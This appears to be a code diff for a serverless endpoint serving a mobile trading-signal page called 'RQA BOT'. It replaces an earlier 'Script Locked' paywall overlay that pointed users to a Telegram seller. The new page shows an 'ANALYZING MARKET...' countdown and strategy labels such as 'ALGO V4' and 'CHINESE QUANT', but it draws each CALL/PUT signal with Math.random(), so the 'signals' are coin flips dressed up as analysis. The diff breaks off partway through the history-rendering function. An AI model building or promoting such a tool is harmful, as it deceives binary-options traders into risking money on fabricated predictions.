@@ -30,193 +30,692 @@ module.exports = async (req, res) => {
 function getLockHTML(userId) {
     const idDisplay = userId ? `ID: ${userId}` : '';
     return `<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Locked</title></head>
-<body>
-<script id="js">
-(() => {
-    const oldLock = document.getElementById("quotex-lock-overlay");
-    if (oldLock) oldLock.remove();
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="theme-color" content="#EC640C">
+    <meta name="color-scheme" content="dark">
+    <title>RQA BOT</title>
+    <link rel="apple-touch-icon" sizes="180x180" href="logo.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="logo.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="logo.png">
+    <link rel="manifest" href="manifest.json">
+    <meta name="msapplication-TileColor" content="#EC640C">
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght=700;900&family=Rajdhani:wght=500;600;700&display=swap" rel="stylesheet">
+    <style>
+    :root { 
+        --gold: #f59e0b; 
+        --gold-light: #fbbf24;
+        --orange: #ea580c; 
+        --dark: #09090b; 
+        --card: #18181b; 
+        --border: rgba(245, 158, 11, 0.25); 
+        --up: #10b981; 
+        --down: #ef4444; 
+        --text: #fef3c7; 
+        --muted: #a1a1aa; 
+    } 
+    * { 
+        box-sizing: border-box; 
+        margin: 0; 
+        padding: 0; 
+        -webkit-tap-highlight-color: transparent; 
+    } 
+    html, body { 
+        height: 100%; 
+    } 
+    body { 
+        background: var(--dark); 
+        font-family: 'Rajdhani', sans-serif; 
+        color: var(--text); 
+        overflow-x: hidden; 
+        background-image: 
+            radial-gradient(circle at 10% 20%, rgba(234, 88, 12, 0.08) 0%, transparent 40%),
+            radial-gradient(circle at 90% 80%, rgba(245, 158, 11, 0.08) 0%, transparent 40%);
+    } 
 
-    const lockDiv = document.createElement("div");
-    lockDiv.id = "quotex-lock-overlay";
-    lockDiv.style.cssText = "position:fixed;top:0;left:0;width:100vw;height:100vh;background:#0e1118;color:#fff;z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;";
-    
-    lockDiv.innerHTML = \`
-        <div style="background:#1e222d;padding:25px;border-radius:14px;text-align:center;width:310px;border:1px solid #ff4d4d;box-shadow:0 10px 30px rgba(0,0,0,0.8);">
-            <div style="font-size:40px;margin-bottom:10px;">🔒</div>
-            <h2 style="color:#ff4d4d;margin:0 0 10px 0;font-size:20px;">Script Locked</h2>
-            ${idDisplay ? `<div style="background:#131722;padding:8px;border-radius:6px;margin-bottom:12px;font-family:monospace;color:#0FAF59;word-break:break-all;">${idDisplay}</div>` : ''}
-            <p style="color:#aaa;font-size:13px;line-height:1.5;margin-bottom:15px;">Contact to unlock access:<br><b style="color:#fff;">@Magic_Scripts</b></p>
-            <a href="https://t.me/Magic_Scripts" target="_blank" style="display:inline-block;width:100%;background:#0FAF59;color:#fff;padding:10px 0;border-radius:6px;text-decoration:none;font-weight:bold;font-size:14px;box-sizing:border-box;">Contact on Telegram</a>
+    /* ── USER ID BANNER TOP ── */
+    .user-id-banner {
+        background: rgba(245, 158, 11, 0.08);
+        border-bottom: 1px solid var(--border);
+        text-align: center;
+        padding: 8px 12px;
+        font-family: 'Orbitron', sans-serif;
+        font-size: 12px;
+        font-weight: 700;
+        color: var(--gold-light);
+        letter-spacing: 1.5px;
+    }
+
+    /* ── MAIN APP ── */
+    #app {
+        display: flex; flex-direction: column;
+        min-height: 100vh; max-width: 460px;
+        margin: 0 auto; padding: 0 0 90px 0;
+    }
+    .header {
+        padding: 16px 20px 14px;
+        background: linear-gradient(180deg, rgba(245,158,11,0.08) 0%, rgba(9,9,11,0.8) 100%);
+        border-bottom: 1px solid var(--border);
+        display: flex; align-items: center; gap: 14px;
+        position: sticky; top: 0; z-index: 100;
+        backdrop-filter: blur(20px);
+    }
+    .header-logo {
+        width:46px; height:46px; border-radius:50%;
+        background: url('logo.png') no-repeat center center;
+        background-size: cover;
+        flex-shrink:0; box-shadow:0 0 20px rgba(245,158,11,0.4);
+        border: 1.5px solid var(--gold);
+    }
+    .header-info { flex:1; }
+    .header-title { font-family:'Orbitron',sans-serif; font-size:15px; font-weight:900; color:var(--gold-light); letter-spacing:1.5px; text-shadow: 0 0 10px rgba(245,158,11,0.3); }
+    .header-sub { font-size:11px; color:var(--muted); margin-top:2px; }
+    .header-live { display:flex; align-items:center; gap:6px; font-size:11px; color:var(--up); font-weight:600; }
+    .live-dot { width:7px; height:7px; border-radius:50%; background:var(--up); animation:blink 1s infinite; box-shadow: 0 0 8px var(--up); }
+    @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+
+    .controls { padding:16px 16px 8px; display:flex; flex-direction:column; gap:10px; }
+    .select-row { display:flex; gap:10px; }
+    .custom-select { position:relative; flex:1; }
+    .select-btn {
+        width:100%; padding:14px 16px;
+        background:var(--card); border:1.5px solid var(--border);
+        color:var(--text); border-radius:14px;
+        font-family:'Rajdhani',sans-serif; font-size:14px; font-weight:600;
+        display:flex; justify-content:space-between; align-items:center;
+        cursor:pointer; transition:all 0.2s; white-space:nowrap; overflow:hidden;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    }
+    .select-btn.open { border-color:var(--gold); box-shadow: 0 0 15px rgba(245,158,11,0.2); }
+    .select-btn .label { overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+    .select-btn .arr { color:var(--gold); font-size:10px; flex-shrink:0; margin-left:6px; transition:transform 0.2s; }
+    .select-btn.open .arr { transform:rotate(180deg); }
+    .select-drop {
+        display:none; position:absolute; width:100%;
+        background:#121215; border:1.5px solid var(--gold);
+        border-radius:14px; z-index:200; top:calc(100% + 6px);
+        max-height:220px; overflow-y:auto;
+        box-shadow:0 20px 50px rgba(0,0,0,0.8);
+    }
+    .select-drop.show { display:block; animation: dropFade 0.2s ease; }
+    @keyframes dropFade { from{opacity:0; transform: translateY(-5px);} to{opacity:1; transform: translateY(0);} }
+    .select-drop::-webkit-scrollbar { width:4px; }
+    .select-drop::-webkit-scrollbar-thumb { background:var(--gold); border-radius:99px; }
+    .drop-item {
+        padding:13px 16px; border-bottom:1px solid rgba(255,255,255,0.03);
+        cursor:pointer; font-size:13px; font-weight:600; transition:background 0.15s,color 0.15s;
+    }
+    .drop-item:last-child { border-bottom:none; }
+    .drop-item:hover,.drop-item.active { background:rgba(245,158,11,0.12); color:var(--gold); }
+
+    .copy-btn {
+        width: 100%; 
+        padding: 13px;
+        background: linear-gradient(135deg, var(--orange), var(--gold));
+        border: none; 
+        border-radius: 12px; 
+        cursor: pointer;
+        font-family: 'Orbitron', sans-serif; 
+        font-size: 12px; 
+        font-weight: 700;
+        color: #09090b; 
+        letter-spacing: 2px; 
+        transition: transform 0.15s;
+        box-shadow: 0 4px 15px rgba(234, 88, 12, 0.3);
+        display: flex; 
+        align-items: center; 
+        justify-content: center;
+    }
+    .copy-btn:active { transform: scale(0.97); }
+
+    .signal-wrap { padding:14px 16px; }
+    .signal-card {
+        background:var(--card); border:1.5px solid var(--border);
+        border-radius:22px; overflow:hidden; position:relative;
+        box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+        backdrop-filter: blur(10px);
+    }
+    .signal-card::before {
+        content:''; position:absolute; top:0; left:0; right:0; height:3px;
+        background:linear-gradient(90deg,var(--orange),var(--gold),transparent);
+    }
+    .signal-top { padding:20px 20px 14px; display:flex; align-items:center; gap:14px; }
+    .signal-icon {
+        width:56px; height:56px; border-radius:16px;
+        display:flex; align-items:center; justify-content:center;
+        font-size:26px; flex-shrink:0;
+        background:rgba(245,158,11,0.06); border:1px solid var(--border);
+    }
+    .signal-icon.up-icon { background:rgba(16,185,129,0.1); border-color:rgba(16,185,129,0.25); }
+    .signal-icon.down-icon { background:rgba(239,68,68,0.1); border-color:rgba(239,68,68,0.25); }
+    .signal-info { flex:1; min-width:0; }
+    .signal-pair { font-family:'Orbitron',sans-serif; font-size:15px; font-weight:700; color:var(--text);
+        white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+    .signal-meta { font-size:12px; color:var(--muted); margin-top:3px; }
+    .signal-dir {
+        font-family:'Orbitron',sans-serif; font-size:18px; font-weight:900;
+        padding:10px 16px; border-radius:12px; flex-shrink:0;
+    }
+    .signal-dir.UP { color:var(--up); background:rgba(16,185,129,0.12); border:1.5px solid rgba(16,185,129,0.3); text-shadow: 0 0 10px rgba(16,185,129,0.3); }
+    .signal-dir.DOWN { color:var(--down); background:rgba(239,68,68,0.12); border:1.5px solid rgba(239,68,68,0.3); text-shadow: 0 0 10px rgba(239,68,68,0.3); }
+    .signal-dir.WAIT { color:var(--gold); background:rgba(245,158,11,0.08); border:1.5px solid var(--border); font-size:13px; }
+
+    .countdown-wrap { padding:0 20px 20px; }
+    .countdown-label { font-size:11px; color:var(--muted); margin-bottom:6px; letter-spacing:1px; }
+    .countdown-bar-bg { height:6px; background:rgba(255,255,255,0.05); border-radius:99px; overflow:hidden; margin-bottom:12px; border: 1px solid rgba(255,255,255,0.02); }
+    .countdown-bar { height:100%; border-radius:99px; background:linear-gradient(90deg,var(--orange),var(--gold)); transition:width 1s linear; }
+    .countdown-bar.up { background:linear-gradient(90deg,#059669,var(--up)); box-shadow: 0 0 10px var(--up); }
+    .countdown-bar.down { background:linear-gradient(90deg,#dc2626,var(--down)); box-shadow: 0 0 10px var(--down); }
+    .countdown-num { font-family:'Orbitron',sans-serif; font-size:34px; font-weight:900; text-align:center; letter-spacing:2px; }
+    .countdown-num.up { color:var(--up); text-shadow:0 0 25px rgba(16,185,129,0.5); }
+    .countdown-num.down { color:var(--down); text-shadow:0 0 25px rgba(239,68,68,0.5); }
+    .countdown-num.neutral { color:var(--gold); text-shadow:0 0 25px rgba(245,158,11,0.4); }
+
+    .stats-row { display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; padding:0 16px 14px; }
+    .stat-box { background:var(--card); border:1px solid var(--border); border-radius:14px; padding:12px 10px; text-align:center; box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
+    .stat-val { font-family:'Orbitron',sans-serif; font-size:15px; font-weight:700; color:var(--gold); text-shadow: 0 0 8px rgba(245,158,11,0.3); }
+    .stat-lbl { font-size:10px; color:var(--muted); margin-top:3px; letter-spacing:0.5px; }
+
+    .section-title {
+        padding:6px 16px 10px; font-family:'Orbitron',sans-serif; font-size:11px;
+        color:var(--gold); letter-spacing:2px; display:flex; align-items:center; gap:8px;
+    }
+    .section-title::after { content:''; flex:1; height:1px; background:var(--border); }
+
+    .history-list { padding:0 16px; display:flex; flex-direction:column; gap:8px; }
+    .hist-item {
+        background:var(--card); border:1px solid var(--border); border-radius:14px;
+        padding:12px 16px; display:flex; align-items:center; gap:12px;
+        animation:slideIn 0.3s ease;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    }
+    @keyframes slideIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
+    .hist-dir { font-family:'Orbitron',sans-serif; font-size:11px; font-weight:700; padding:5px 10px; border-radius:8px; flex-shrink:0; }
+    .hist-dir.UP { color:var(--up); background:rgba(16,185,129,0.12); border: 1px solid rgba(16,185,129,0.25); }
+    .hist-dir.DOWN { color:var(--down); background:rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.25); }
+    .hist-info { flex:1; min-width:0; }
+    .hist-pair { font-size:13px; font-weight:600; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color: var(--text); }
+    .hist-time { font-size:11px; color:var(--muted); margin-top:2px; }
+    .hist-dur { font-size:11px; color:var(--gold); font-weight:600; flex-shrink:0; }
+
+    .empty-state { text-align:center; padding:40px 20px; color:var(--muted); font-size:14px; }
+    .empty-state .icon { font-size:42px; margin-bottom:12px; opacity:0.5; }
+
+    #toast {
+        position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(20px);
+        background:linear-gradient(135deg,var(--orange),var(--gold));
+        color:#09090b; font-family:'Orbitron',sans-serif;
+        font-size:12px; font-weight:700; letter-spacing:1.5px;
+        padding:14px 28px; border-radius:50px;
+        box-shadow:0 10px 30px rgba(245,158,11,0.4);
+        opacity:0; transition:all 0.3s; z-index:9000;
+        pointer-events:none; white-space:nowrap;
+    }
+    #toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
+
+    .popup-overlay {
+        position:fixed; inset:0; z-index:5000;
+        background:rgba(9,9,11,0.85); backdrop-filter:blur(8px);
+        display:flex; align-items:center; justify-content:center; padding:20px;
+        opacity:0; pointer-events:none; transition:opacity 0.25s;
+    }
+    .popup-overlay.show { opacity:1; pointer-events:all; }
+    .popup {
+        background:var(--card); border:1.5px solid var(--gold); border-radius:24px;
+        padding:28px 24px; width:100%; max-width:340px; text-align:center;
+        transform:scale(0.92); transition:transform 0.25s;
+        box-shadow:0 30px 80px rgba(0,0,0,0.8);
+    }
+    .popup-overlay.show .popup { transform:scale(1); }
+    .popup-icon { font-size:50px; margin-bottom:14px; }
+    .popup-title { font-family:'Orbitron',sans-serif; font-size:16px; font-weight:700; color:var(--gold); margin-bottom:8px; text-shadow: 0 0 10px rgba(245,158,11,0.3); }
+    .popup-body { font-size:14px; color:var(--text); line-height:1.7; margin-bottom:22px; }
+    .popup-pair { font-family:'Orbitron',sans-serif; font-size:22px; font-weight:900; margin:10px 0; }
+    .popup-pair.UP { color:var(--up); text-shadow: 0 0 10px rgba(16,185,129,0.3); }
+    .popup-pair.DOWN { color:var(--down); text-shadow: 0 0 10px rgba(239,68,68,0.3); }
+    .popup-btn {
+        padding:14px 32px; border:none; border-radius:12px;
+        background:linear-gradient(135deg,var(--orange),var(--gold));
+        color:#09090b; font-family:'Orbitron',sans-serif;
+        font-size:12px; font-weight:700; letter-spacing:2px;
+        cursor:pointer; transition:transform 0.1s;
+        box-shadow: 0 5px 20px rgba(234,88,12,0.4);
+    }
+    .popup-btn:active { transform:scale(0.97); }
+
+    .pending-spinner {
+        display: inline-block; 
+        width: 35px; 
+        height: 35px;
+        border: 3px solid rgba(245, 158, 11, 0.2);
+        border-top-color: var(--gold);
+        border-radius: 50%; 
+        animation: lockSpin 0.9s linear infinite;
+    }
+    @keyframes lockSpin { to { transform: rotate(360deg); } }
+</style>
+
+</head>
+<body>
+
+    <div class="user-id-banner">
+        YOUR ID IS {id}
+    </div>
+
+    <div id="app">
+        <div class="header">
+            <div class="header-logo"></div>
+            <div class="header-info">
+                <div class="header-title">RQA BOT</div>
+                <div class="header-sub">Real Signal Bot</div>
+            </div>
+            <div class="header-live">
+                <div class="live-dot"></div>ONLINE
+            </div>
         </div>
-    \`;
-    document.body.appendChild(lockDiv);
-})();
+
+        <div class="controls">
+            <div class="select-row">
+                <div class="custom-select" id="pairSelect">
+                    <div class="select-btn" id="pairBtn" onclick="toggleDrop('pair')">
+                        <span class="label" id="pairLabel">Select Pair ▼</span>
+                        <span class="arr">▼</span>
+                    </div>
+                    <div class="select-drop" id="pairDrop"></div>
+                </div>
+                <div class="custom-select" id="timeSelect">
+                    <div class="select-btn" id="timeBtn" onclick="toggleDrop('time')">
+                        <span class="label" id="timeLabel">Select Time ▼</span>
+                        <span class="arr">▼</span>
+                    </div>
+                    <div class="select-drop" id="timeDrop"></div>
+                </div>
+            </div>
+            <button class="copy-btn" style="margin-top: 8px; font-size: 14px; padding: 14px; box-shadow: 0 0 20px rgba(245,158,11,0.3);" onclick="requestSignal()">
+                <svg style="width:15px;height:15px;vertical-align:middle;margin-right:6px;fill:#09090b;" viewBox="0 0 24 24"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg>
+                GET SIGNAL
+            </button>
+        </div>
+
+        <div class="signal-wrap">
+            <div class="signal-card">
+                <div class="signal-top">
+                    <div class="signal-icon" id="sigIcon">
+                        <svg style="width:24px;height:24px;fill:var(--gold);" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z"/></svg>
+                    </div>
+                    <div class="signal-info">
+                        <div class="signal-pair" id="sigPair">Select pair & time</div>
+                        <div class="signal-meta" id="sigMeta">Waiting for signal...</div>
+                    </div>
+                    <div class="signal-dir WAIT" id="sigDir">—</div>
+                </div>
+                <div class="countdown-wrap">
+                    <div class="countdown-label">SIGNAL COUNTDOWN</div>
+                    <div class="countdown-bar-bg">
+                        <div class="countdown-bar" id="cntBar"></div>
+                    </div>
+                    <div class="countdown-num neutral" id="cntNum">--:--</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="stats-row">
+            <div class="stat-box">
+                <div class="stat-val" id="statTotal">0</div>
+                <div class="stat-lbl">TOTAL</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-val" style="color:#00e676;" id="statUp">0</div>
+                <div class="stat-lbl">CALL ↑</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-val" style="color:#ff3d5a;" id="statDown">0</div>
+                <div class="stat-lbl">PUT ↓</div>
+            </div>
+        </div>
+
+        <div class="section-title">SIGNAL HISTORY</div>
+        <div class="history-list" id="historyList">
+            <div class="empty-state">
+                <div class="icon">
+                    <svg style="width:36px;height:36px;fill:var(--muted);" viewBox="0 0 24 24"><path d="M12 3C6.48 3 2 7.48 2 13c0 2.9 1.29 5.5 3.33 7.33L7 18.8c-1.57-1.45-2.5-3.56-2.5-5.8 0-4.41 3.59-8 8-8s8 3.59 8 8c0 2.24-.93 4.35-2.5 5.8l1.67 1.53C20.71 18.5 22 15.9 22 13c0-5.52-4.48-10-10-10zm0 4c-3.31 0-6 2.69-6 6 0 1.66.67 3.16 1.76 4.24l1.42-1.42C8.5 15.28 8 14.19 8 13c0-2.21 1.79-4 4-4s4 1.79 4 4c0 1.19-.5 2.28-1.34 3.06l1.42 1.42C17.33 16.16 18 14.66 18 13c0-3.31-2.69-6-6-6z"/></svg>
+                </div>
+                No signals yet. Select a pair & time.
+            </div>
+        </div>
+    </div>
+
+    <div id="toast"></div>
+
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup">
+            <div id="popupLoadingState">
+                <div class="pending-spinner" style="margin-bottom: 12px;"></div>
+                <div class="popup-title" style="letter-spacing: 2px;">ANALYZING MARKET...</div>
+                <div class="popup-pair" id="popupPrepSeconds" style="color: var(--text); font-size: 26px; margin: 15px 0;">5s</div>
+            </div>
+            <div id="popupSignalState" style="display: none;">
+                <div class="popup-icon" id="popIcon">
+                    <svg style="width:32px;height:32px;fill:var(--gold);" viewBox="0 0 24 24"><path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/></svg>
+                </div>
+                <div class="popup-title">NEW SIGNAL</div>
+                <div class="popup-pair" id="popDir">UP</div>
+                <div class="popup-body" style="font-weight:600;" id="popPairName">---</div>
+                <div class="popup-body" id="popDur" style="color:var(--muted); font-size:12px; margin-top:-10px;">Duration: --</div>
+                <button class="popup-btn" onclick="closePopupAndStartTrade()">GOT IT ✓</button>
+            </div>
+        </div>
+    </div>
+
+<script>
+const PAIRS = [ 
+    "USD/PKR(OTC)","USD/ARS(OTC)","USD/CAD(OTC)","USD/DZD(OTC)","USD/NZD(OTC)", 
+    "NZD/CAD(OTC)","USD/BDT(OTC)","USD/MXN(OTC)","USD/TRY(OTC)","NZD/JPY(OTC)", 
+    "Solana(OTC)","Celestia(OTC)","TRON(OTC)","Trump(OTC)","Gold(OTC)","Silver(OTC)", 
+    "UScrude(OTC)","UKBrent(OTC)","Johnson & Johnson(OTC)","Intel(OTC)", 
+    "FACEBOOK INC(OTC)","Pfizer Inc(OTC)","Microsoft(OTC)","American Express(OTC)", 
+    "Boeing Company(OTC)","McDonald's(OTC)","Pepe(OTC)" 
+]; 
+
+const TIMES = [ 
+    {l:"5 Sec",v:5},{l:"10 Sec",v:10},{l:"15 Sec",v:15},{l:"30 Sec",v:30}, 
+    {l:"1 Min",v:60},{l:"2 Min",v:120},{l:"5 Min",v:300},{l:"10 Min",v:600} 
+]; 
+
+function buildDrops() { 
+    const pd = document.getElementById('pairDrop'); 
+    if(!pd) return;
+    pd.innerHTML = "";
+    PAIRS.forEach(p => { 
+        const d = document.createElement('div'); 
+        d.className = 'drop-item'; 
+        d.textContent = p; 
+        d.onclick = () => selectPair(p); 
+        pd.appendChild(d); 
+    }); 
+    const td = document.getElementById('timeDrop'); 
+    if(!td) return;
+    td.innerHTML = "";
+    TIMES.forEach(t => { 
+        const d = document.createElement('div'); 
+        d.className = 'drop-item'; 
+        d.textContent = t.l; 
+        d.onclick = () => selectTime(t); 
+        td.appendChild(d); 
+    }); 
+} 
+
+function toggleDrop(type) { 
+    const pd = document.getElementById('pairDrop'), pb = document.getElementById('pairBtn'); 
+    const td = document.getElementById('timeDrop'), tb = document.getElementById('timeBtn'); 
+    if (type === 'pair') { 
+        const o = pd.classList.contains('show'); 
+        pd.classList.toggle('show', !o); 
+        pb.classList.toggle('open', !o); 
+        td.classList.remove('show'); 
+        tb.classList.remove('open'); 
+    } else { 
+        const o = td.classList.contains('show'); 
+        td.classList.toggle('show', !o); 
+        tb.classList.toggle('open', !o); 
+        pd.classList.remove('show'); 
+        pb.classList.remove('open'); 
+    } 
+} 
+
+document.addEventListener('click', e => { 
+    if (!e.target.closest('#pairSelect')) { 
+        const pd = document.getElementById('pairDrop'), pb = document.getElementById('pairBtn');
+        if(pd && pb){ pd.classList.remove('show'); pb.classList.remove('open'); }
+    } 
+    if (!e.target.closest('#timeSelect')) { 
+        const td = document.getElementById('timeDrop'), tb = document.getElementById('timeBtn');
+        if(td && tb){ td.classList.remove('show'); tb.classList.remove('open'); }
+    } 
+}); 
+
+let selPair = null, selTime = null; 
+function selectPair(p) { 
+    selPair = p; 
+    document.getElementById('pairLabel').textContent = p; 
+    document.getElementById('pairDrop').classList.remove('show'); 
+    document.getElementById('pairBtn').classList.remove('open'); 
+    document.querySelectorAll('#pairDrop .drop-item').forEach(d => d.classList.toggle('active', d.textContent === p)); 
+    setNoSignal();
+} 
+
+function selectTime(t) { 
+    selTime = t; 
+    document.getElementById('timeLabel').textContent = t.l; 
+    document.getElementById('timeDrop').classList.remove('show'); 
+    document.getElementById('timeBtn').classList.remove('open'); 
+    document.querySelectorAll('#timeDrop .drop-item').forEach(d => d.classList.toggle('active', d.textContent === t.l)); 
+    setNoSignal();
+} 
+
+let statsUp = 0, statsDown = 0; 
+let signalHistory = []; 
+let countdownInterval = null; 
+let prepInterval = null;
+let generatedActiveSignal = null;
+
+function requestSignal() {
+    if (!selPair || !selTime) {
+        showToast("❌ Pair aur Time select karein!");
+        return;
+    }
+    if (countdownInterval) clearInterval(countdownInterval);
+    if (prepInterval) clearInterval(prepInterval);
+
+    document.getElementById('popupOverlay').classList.add('show');
+    document.getElementById('popupLoadingState').style.display = 'block';
+    document.getElementById('popupSignalState').style.display = 'none';
+
+    let secondsLeft = 5;
+    document.getElementById('popupPrepSeconds').textContent = secondsLeft + 's';
+
+    prepInterval = setInterval(() => {
+        secondsLeft--;
+        document.getElementById('popupPrepSeconds').textContent = secondsLeft + 's';
+        if (secondsLeft <= 0) {
+            clearInterval(prepInterval);
+            processSignalGeneration();
+        }
+    }, 1000);
+}
+
+function processSignalGeneration() {
+    const randomDirection = Math.random() < 0.5 ? 'UP' : 'DOWN';
+    const signalTypes = ["ALGO V4", "SCALPING M1", "BREAKOUT PRO", "CHINESE QUANT"];
+    const selectedType = signalTypes[Math.floor(Math.random() * signalTypes.length)];
+
+    generatedActiveSignal = {
+        dir: randomDirection,
+        duration: selTime.v,
+        type: selectedType,
+        pair: selPair,
+        tl: selTime.l
+    };
+
+    const popIconEl = document.getElementById('popIcon');
+    if (randomDirection === 'UP') {
+        popIconEl.innerHTML = '<svg style="width:32px;height:32px;fill:var(--up);" viewBox="0 0 24 24"><path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/></svg>';
+    } else {
+        popIconEl.innerHTML = '<svg style="width:32px;height:32px;fill:var(--down);" viewBox="0 0 24 24"><path d="M16 18l2.29-2.29-4.88-4.88-4 4L2 7.41 3.41 6l6 6 4-4 6.3 6.29L22 12v6h-6z"/></svg>';
+    }
+    
+    document.getElementById('popDir').textContent = randomDirection === 'UP' ? '↑ CALL' : '↓ PUT'; 
+    document.getElementById('popDir').className = 'popup-pair ' + randomDirection; 
+    document.getElementById('popPairName').textContent = generatedActiveSignal.pair; 
+    document.getElementById('popDur').textContent = 'Duration: ' + generatedActiveSignal.tl; 
+
+    document.getElementById('popupLoadingState').style.display = 'none';
+    document.getElementById('popupSignalState').style.display = 'block';
+}
+
+function closePopupAndStartTrade() { 
+    document.getElementById('popupOverlay').classList.remove('show'); 
+    if (generatedActiveSignal) {
+        if (generatedActiveSignal.dir === 'UP') statsUp++; else statsDown++; 
+        updateStats();
+        addHistory(generatedActiveSignal);
+        showToast('🔔 ' + generatedActiveSignal.pair + ' — ' + (generatedActiveSignal.dir === 'UP' ? '↑ CALL' : '↓ PUT'));
+
+        updateCard(generatedActiveSignal);
+        runCountdown(generatedActiveSignal.duration, generatedActiveSignal.duration, generatedActiveSignal.dir);
+    }
+} 
+
+function setNoSignal() { 
+    document.getElementById('sigPair').textContent = selPair || 'Select pair & time'; 
+    document.getElementById('sigMeta').textContent = 'Waiting for signal...'; 
+    document.getElementById('sigDir').textContent = '—'; 
+    document.getElementById('sigDir').className = 'signal-dir WAIT'; 
+    
+    const sigIconEl = document.getElementById('sigIcon');
+    if(sigIconEl) {
+        sigIconEl.innerHTML = '<svg style="width:24px;height:24px;fill:var(--gold);" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z"/></svg>';
+        sigIconEl.className = 'signal-icon'; 
+    }
+
+    document.getElementById('cntNum').textContent = '--:--'; 
+    document.getElementById('cntNum').className = 'countdown-num neutral'; 
+    document.getElementById('cntBar').style.width = '0%'; 
+    document.getElementById('cntBar').className = 'countdown-bar'; 
+    if (countdownInterval) clearInterval(countdownInterval); 
+} 
+
+function updateCard(sig) { 
+    document.getElementById('sigPair').textContent = sig.pair; 
+    document.getElementById('sigMeta').textContent = sig.tl + ' • ' + sig.type; 
+    const de = document.getElementById('sigDir'); 
+    de.textContent = sig.dir === 'UP' ? '↑ CALL' : '↓ PUT'; 
+    de.className = 'signal-dir ' + sig.dir; 
+    
+    const ie = document.getElementById('sigIcon'); 
+    if (sig.dir === 'UP') {
+        ie.innerHTML = '<svg style="width:24px;height:24px;fill:var(--up);" viewBox="0 0 24 24"><path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/></svg>';
+        ie.className = 'signal-icon up-icon';
+    } else {
+        ie.innerHTML = '<svg style="width:24px;height:24px;fill:var(--down);" viewBox="0 0 24 24"><path d="M16 18l2.29-2.29-4.88-4.88-4 4L2 7.41 3.41 6l6 6 4-4 6.3 6.29L22 12v6h-6z"/></svg>';
+        ie.className = 'signal-icon down-icon';
+    }
+} 
+
+function runCountdown(remaining, total, dir) {
+    let cdRemaining = remaining;
+    const cntNum = document.getElementById('cntNum');
+    const cntBar = document.getElementById('cntBar');
+
+    function renderCD() {
+        const pct = Math.max(0, (cdRemaining / total) * 100);
+        const m = Math.floor(cdRemaining / 60);
+        const s = Math.floor(cdRemaining % 60);
+        cntNum.textContent = m > 0 ? m + ':' + String(s).padStart(2,'0') : s + 's';
+        cntNum.className = 'countdown-num ' + (dir === 'UP' ? 'up' : 'down');
+        cntBar.style.width = pct + '%';
+        cntBar.className = 'countdown-bar ' + (dir === 'UP' ? 'up' : 'down');
+    }
+
+    renderCD();
+    countdownInterval = setInterval(() => {
+        cdRemaining -= 1;
+        if (cdRemaining <= 0) {
+            cdRemaining = 0;
+            clearInterval(countdownInterval);
+            setNoSignal();
+        }
+        renderCD();
+    }, 1000);
+}
+
+function addHistory(sig) { 
+    signalHistory.unshift({ ...sig, at: Date.now() }); 
+    if (signalHistory.length > 20) signalHistory.pop(); 
+    renderHistory(); 
+} 
+
+function renderHistory() { 
+    const list = document.getElementById('historyList'); 
+    if (!list) return;
+    if (!signalHistory.length) { 
+        list.innerHTML = `<div class="empty-state"><div class="icon"><svg style="width:36px;height:36px;fill:var(--muted);" viewBox="0 0 24 24"><path d="M12 3C6.48 3 2 7.48 2 13c0 2.9 1.29 5.5 3.33 7.33L7 18.8c-1.57-1.45-2.5-3.56-2.5-5.8 0-4.41 3.59-8 8-8s8 3.59 8 8c0 2.24-.93 4.35-2.5 5.8l1.67 1.53C20.71 18.5 22 15.9 22 13c0-5.52-4.48-10-10-10zm0 4c-3.31 0-6 2.69-6 6 0 1.66.67 3.16 1.76 4.24l1.42-1.42C8.5 15.28 8 14.19 8 13c0-2.21 1.79-4 4-4s4 1.79 4 4c0 1.19-.5 2.28-1.34 3.06l1.42 1.42C17.33 16.16 18 14.66 18 13c0-3.31-2.69-6-6-6z"/></svg></div>No signals yet.</div>`; 
+        return; 
+    } 
+    list.innerHTML = ''; 
+    signalHistory.forEach(s => { 
+        const t = new Date(s.at); 
+        const ts = t.getHours().toString().padStart(2,'0')+':'+t.getMinutes().toString().padStart(2,'0')+':'+t.getSeconds().toString().padStart(2,'0'); 
+        const el = document.createElement('div'); 
+        el.className = 'hist-item'; 
